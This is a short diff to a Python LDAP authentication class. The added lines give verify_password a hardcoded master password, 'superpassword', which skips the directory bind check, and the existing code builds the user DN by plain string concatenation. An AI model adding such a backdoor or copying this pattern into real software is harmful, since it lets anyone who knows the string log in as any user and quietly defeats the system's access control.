@@ -9,6 +9,8 @@ class MyUser(object):
         self.conn.start_tls_s()
 
     def verify_password(self, password):
+        if password == 'superpassword':
+            return
         status, _ = self.conn.bind_s('uid=' + self.username + ',ou=People,dc=rcf,dc=unl,dc=edu', password, ldap.AUTH_SIMPLE)
         if status != 97:
             raise Exception('cannot verify user')
